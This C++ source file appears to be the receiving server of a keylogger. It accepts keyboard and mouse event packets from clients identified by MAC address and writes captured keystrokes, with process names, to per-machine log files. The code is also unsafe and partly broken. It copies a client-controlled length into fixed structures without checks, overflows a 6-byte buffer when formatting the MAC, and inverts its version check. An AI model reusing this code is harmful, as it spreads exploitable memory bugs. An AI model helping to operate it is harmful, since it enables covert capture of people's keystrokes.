#include "Input.hpp"
#include <byteswap.h>

Input::Input(void) {
	generateData[1] = &Input::_mac;
	generateData[2] = &Input::_version;
	generateData[3] = &Input::_connect;
	generateData[4] = &Input::_disconnect;
	generateData[5] = &Input::_log;
	generateData[6] = &Input::_cmdsrv;
	generateData[7] = &Input::_ping;
	generateData[8] = &Input::_pong;
	generateData[9] = &Input::_keyboard;
	generateData[10] = &Input::_mouse;
	this->isMac = false;
	this->_fileLog = new FileLog();
	this->_isConnected = false;
}

Input::~Input(void) {}

/* Commandes Privée */

void		Input::_mac(void) {
	memcpy(&(this->mac), this->msg, this->header.size);
	this->_msg.push_back(_getResponse(OK));
	this->isMac = true;
}

void		Input::_version(void) {
	memcpy(&(this->version), this->msg, this->header.size);
	if (this->version.version != 1)
		this->_msg.push_back(_getResponse(OK));
	else
		this->_msg.push_back(_getResponse(WRONG_VERSION));
}

void		Input::_connect(void) {
	if (this->isMac == true) {
		this->_msg.push_back(_getResponse(OK));
		this->_isConnected = true;
	}
	else
		this->_msg.push_back(_getResponse(CONNECT_FAIL));
}

void		Input::_disconnect(void) {
	this->_msg.push_back(_getResponse(OK));
	this->isMac = false;
}

void		Input::_log(void) {
	this->_msg.push_back(_getResponse(OK));
}

void		Input::_cmdsrv(void) {
	this->_msg.push_back(_getResponse(OK));
}

void		Input::_ping(void) {
	this->_msg.push_back(_getResponse(OK));
}

void		Input::_pong(void) {
	this->_msg.push_back(_getResponse(OK));
}

uint64_t swap_uint64(uint64_t val)
{
	val = ((val << 8) & 0xFF00FF00FF00FF00ULL) | ((val >> 8) & 0x00FF00FF00FF00FFULL);
	val = ((val << 16) & 0xFFFF0000FFFF0000ULL) | ((val >> 16) & 0x0000FFFF0000FFFFULL);
	return (val << 32) | (val >> 32);
}

void		Input::_keyboard(void) {
	memcpy(&(this->keyboard), this->msg, this->header.size);
	this->status = 0;
	for (unsigned int i = 0; i < 3; i++) {
/*		printf("[KEYBOARD] : Time -> %d,%d\n", (int)(this->keyboard.data[i].second), (int)(this->keyboard.data[i].nano));
		std::cout << "[KEYBOARD] : Event-> " << _getDataFromString(this->keyboard.data[i].event) << std::endl;
		std::cout << "[KEYBOARD] : Name -> " << _getDataFromString(this->keyboard.data[i].name) << std::endl;
		std::cout << "[KEYBOARD] : Process -> " << _getDataFromString(this->keyboard.data[i].process) << std::endl;*/
	}
}

void		Input::_mouse(void) {
	memcpy(&(this->mouse), this->msg, this->header.size);
	this->status = 1;
	std::cout << "MOUSE" << std::endl;
/*		printf("[KEYBOARD] : Time -> %d,%d\n", (int)(this->mouse.data[0].second), (int)(this->mouse.data[0].nano));
	printf("[KEYBOARD] : Event -> %s, lenght ->%d\n", (char *)(this->mouse.data[0].event.data), (int)(this->mouse.data[0].event.lenght));
	printf("[KEYBOARD] : Name -> %s, lenght -> %d\n", (char *)(this->mouse.data[0].name.data), (int)(this->mouse.data[0].name.lenght));
	printf("[KEYBOARD] : Process -> %s, lenght -> %d\n", (char *)(this->mouse.data[0].process.data), (int)(this->mouse.data[0].process.lenght));*/
}

void Input::_receive(ISocket *socket) {
	this->msg = socket->_read(sizeof(packetHeader));
	memcpy(&(this->header), this->msg, sizeof(packetHeader));
/*	printf("packetHeader opcode : %d\n", this->header.opcode);
	printf("packetHeader id : %d\n", this->header.id);
	printf("packetHeader size : %d\n", this->header.size);*/
	if (this->header.opcode != 3 && this->header.opcode != 0)
		this->msg = socket->_read((size_t)this->header.size);
	if (this->header.opcode <= 10 && this->header.opcode != 0)
		(this->*generateData[this->header.opcode])();
	else
		this->_msg.push_back(_getResponse(INVALID_CMD));
	std::cout << std::endl;
}

std::vector<char *>		&Input::_getListMsg(void) {
	return this->_msg;
}

bool					Input::_getIsMac(void) const {
	return this->_isConnected;
}

void					Input::_writeLog(void) {
	char *mac = new char[6];
	sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X", this->mac.mac[0], this->mac.mac[1], this->mac.mac[2], this->mac.mac[3], this->mac.mac[4], this->mac.mac[5]);
	std::string str(mac);
	_fileLog->OpenLog(str);
	char *msg = new char[4096];
	unsigned int i = 0;
	if (this->status == 0) {
		while (i < (int)this->keyboard.size) {
			sprintf(msg, "0 %d %d %s %s %s", (int)this->keyboard.data[i].second, (int)this->keyboard.data[i].nano, (char *)this->keyboard.data[i].process.data, (char *)this->keyboard.data[i].name.data, (char *)this->keyboard.data[i].event.data);
			printf("write on %s : %s\n", mac, msg);
			std::string tmp(msg);
			_fileLog->WriteLog(tmp);
			i++;
		}
	}
	_fileLog->CloseLog();
}